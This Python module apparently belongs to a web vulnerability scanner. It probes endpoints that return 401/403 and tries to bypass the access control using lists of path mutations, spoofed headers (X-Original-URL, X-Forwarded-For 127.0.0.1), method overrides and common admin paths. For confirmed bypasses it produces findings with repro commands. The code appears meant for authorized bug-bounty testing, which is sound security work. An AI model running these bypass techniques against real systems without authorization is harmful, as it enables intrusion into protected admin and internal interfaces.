"""Access-control bypass on endpoints that answered 401 or 403.

A guarded path is a strong lead: someone decided it needed protecting, which
means whatever is behind it is worth having. Bypassing that guard is one of the
most reliably paid findings in bug bounty, and it is almost always done by hand
because the technique list is tedious rather than difficult.

The oracle is strict, because "200" alone is not a bypass:

  * the original must actually be 401 or 403,
  * the variant must return 200 with a body that differs from the denial page,
  * and it must not match the origin's catch-all,
  * and it must reproduce on a second request.

That last condition matters more than it looks: several of these techniques
change the path in ways a load balancer may route inconsistently, so a
one-shot 200 is often noise rather than a bypass.
"""

from __future__ import annotations

import re
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlsplit, urlunsplit

from assay import owasp
from assay.context import Context
from assay.models import Evidence, Finding, WebTarget
from assay.modules import Module, register
from assay.net import Resp, similarity

# Path mutations. Each is (label, transform) applied to the guarded path.
PATH_TRICKS: List[Tuple[str, str]] = [
    ("trailing dot", "%s/."),
    ("double slash", "%s//"),
    ("leading dot-slash", "/.%s"),
    ("path parameter", "%s/..;/"),
    ("semicolon suffix", "%s;/"),
    ("encoded slash", "%s%%2f"),
    ("encoded dot-dot", "%s/%%2e"),
    ("trailing question", "%s?"),
    ("trailing hash", "%s%%23"),
    ("wildcard suffix", "%s/*"),
    ("extension suffix", "%s.json"),
    ("space suffix", "%s%%20"),
    ("null suffix", "%s%%00"),
    ("backslash", "%s\\\\"),
]

# Headers that make a reverse proxy or framework re-evaluate the route or the
# apparent client address.
HEADER_TRICKS: List[Tuple[str, Dict[str, str]]] = [
    ("X-Original-URL", {"X-Original-URL": "{path}"}),
    ("X-Rewrite-URL", {"X-Rewrite-URL": "{path}"}),
    ("X-Forwarded-For localhost", {"X-Forwarded-For": "127.0.0.1"}),
    ("X-Forwarded-Host localhost", {"X-Forwarded-Host": "127.0.0.1"}),
    ("X-Originating-IP", {"X-Originating-IP": "127.0.0.1"}),
    ("X-Remote-Addr", {"X-Remote-Addr": "127.0.0.1"}),
    ("X-Client-IP", {"X-Client-IP": "127.0.0.1"}),
    ("X-Custom-IP-Authorization", {"X-Custom-IP-Authorization": "127.0.0.1"}),
    ("X-Forwarded-Proto", {"X-Forwarded-Proto": "http"}),
    ("Referer self", {"Referer": "{origin}{path}"}),
]

METHOD_TRICKS = ["POST", "HEAD", "OPTIONS", "PUT", "TRACE"]
OVERRIDE_HEADERS = [("X-HTTP-Method-Override", "GET"),
                    ("X-Method-Override", "GET"),
                    ("X-HTTP-Method", "GET")]

# Paths a guard is usually protecting, tried when nothing was crawled.
PROBE_PATHS = ["/admin", "/administrator", "/manage", "/management", "/console",
               "/dashboard", "/internal", "/private", "/api/admin", "/actuator",
               "/metrics", "/debug", "/status", "/server-status", "/config"]


def case_variants(path: str) -> List[Tuple[str, str]]:
    """Some routers match case-sensitively while the guard does not."""
    letters = [c for c in path if c.isalpha()]
    if not letters:
        return []
    out = []
    if path.lower() != path:
        out.append(("lowercase path", path.lower()))
    upper = re.sub(r"([a-z])", lambda m: m.group(1).upper(), path, count=1)
    if upper != path:
        out.append(("first letter uppercased", upper))
    if path.upper() != path:
        out.append(("uppercase path", path.upper()))
    return out


@register
class ForbiddenBypassModule(Module):
    name = "bypass"
    stage = "active"
    scope = "web"
    impact_class = "probe"
    desc = "401/403 access-control bypass via path, header and method tricks"

    def run_web(self, ctx: Context, wt: WebTarget) -> List[Finding]:
        origin = re.sub(r"(https?://[^/]+).*", r"\1", (wt.final_url or wt.url))
        guarded = self._guarded_paths(ctx, wt, origin)
        if not guarded:
            return []

        bl = ctx.baseline_for(origin)
        out: List[Finding] = []
        budget = 2 if ctx.cfg.profile == "quick" else (
            5 if ctx.cfg.profile == "standard" else 12)

        for path, denial in guarded[:budget]:
            hit = self._attempt(ctx, origin, path, denial, bl)
            if hit:
                out.append(hit)
        return out

    # ------------------------------------------------------------------
    def _guarded_paths(self, ctx: Context, wt: WebTarget,
                       origin: str) -> List[Tuple[str, Resp]]:
        """Paths that actually answer 401/403 - the only ones worth bypassing."""
        candidates: List[str] = []
        for u in ctx.urls.get(origin, []):
            p = urlsplit(u).path
            if p and p not in candidates:
                candidates.append(p)
        if ctx.cfg.profile != "quick":
            candidates += [p for p in PROBE_PATHS if p not in candidates]

        guarded: List[Tuple[str, Resp]] = []
        for path in candidates[:24]:
            r = ctx.http.get(origin + path)
            if r.ok and r.status in (401, 403):
                guarded.append((path, r))
            if len(guarded) >= 12:
                break
        return guarded

    def _attempt(self, ctx: Context, origin: str, path: str,
                 denial: Resp, bl) -> Optional[Finding]:
        for label, variant in self._variants(path):
            r = ctx.http.get(origin + variant)
            if not self._is_bypass(r, denial, bl):
                continue
            # Route-changing tricks can succeed once by accident.
            again = ctx.http.get(origin + variant)
            if not self._is_bypass(again, denial, bl):
                continue
            return self._finding(origin, path, label,
                                 "%s %s" % ("GET", origin + variant), denial, r)

        for label, headers in HEADER_TRICKS:
            hdrs = {k: v.replace("{path}", path).replace("{origin}", origin)
                    for k, v in headers.items()}
            r = ctx.http.get(origin + path, headers=hdrs)
            if not self._is_bypass(r, denial, bl):
                continue
            again = ctx.http.get(origin + path, headers=hdrs)
            if not self._is_bypass(again, denial, bl):
                continue
            return self._finding(origin, path, "header: %s" % label,
                                 r.curl(), denial, r)

        for header, value in OVERRIDE_HEADERS:
            for method in ("POST", "HEAD"):
                r = ctx.http.request(method, origin + path, headers={header: value})
                if not self._is_bypass(r, denial, bl):
                    continue
                again = ctx.http.request(method, origin + path,
                                         headers={header: value})
                if not self._is_bypass(again, denial, bl):
                    continue
                return self._finding(origin, path,
                                     "%s: %s via %s" % (header, value, method),
                                     r.curl(), denial, r)

        for method in METHOD_TRICKS:
            r = ctx.http.request(method, origin + path)
            if not self._is_bypass(r, denial, bl):
                continue
            again = ctx.http.request(method, origin + path)
            if not self._is_bypass(again, denial, bl):
                continue
            return self._finding(origin, path, "method: %s" % method,
                                 r.curl(), denial, r)
        return None

    def _variants(self, path: str) -> List[Tuple[str, str]]:
        out = [(label, tmpl % path) for label, tmpl in PATH_TRICKS]
        out += case_variants(path)
        return out

    @staticmethod
    def _is_bypass(r: Resp, denial: Resp, bl) -> bool:
        if not r.ok or r.status != 200:
            return False
        if bl.is_noise(r):
            return False
        body = r.body.strip()
        if not body:
            # A 200 with no body is a redirect target or a HEAD, not access.
            return False
        # Must differ from what the guard returned.
        if similarity(body, denial.body) > 0.85:
            return False
        # A login page returned with 200 is still a denial.
        if re.search(r"<title[^>]*>\s*(sign in|log ?in|unauthor|forbidden|"
                     r"access denied)", body[:2000], re.I):
            return False
        return True

    @staticmethod
    def _finding(origin: str, path: str, technique: str, repro: str,
                 denial: Resp, hit: Resp) -> Finding:
        return Finding(
            title="Access control bypass on %s (%s)" % (path, technique),
            target=origin + path,
            severity="high",
            confidence="confirmed",
            category=owasp.A01,
            cwe="CWE-284",
            module="bypass",
            impact=(
                "The endpoint returns %d to a direct request but serves content when "
                "the request is altered by '%s'. The guard is applied at a layer that "
                "does not agree with the layer that routes the request, so the "
                "protection can be skipped entirely. Read what is behind it to "
                "establish severity - an admin interface or an internal API reached "
                "this way is a high-impact access-control failure, and that is the "
                "finding to report rather than the bypass technique itself."
                % (denial.status, technique)
            ),
            detail="Direct request: %d. With '%s': %d, %d bytes."
                   % (denial.status, technique, hit.status, len(hit.body)),
            repro=repro,
            refs=["https://cwe.mitre.org/data/definitions/284.html",
                  "https://portswigger.net/web-security/access-control"],
            tags=["bypass", "verified", "manual-followup"],
            chainable=True,
            evidence=[
                denial.evidence(label="Direct request is denied", body_limit=300),
                hit.evidence(label="Bypassed with %s" % technique, body_limit=600),
            ],
            dedupe_key="bypass|%s%s" % (origin, path),
        )
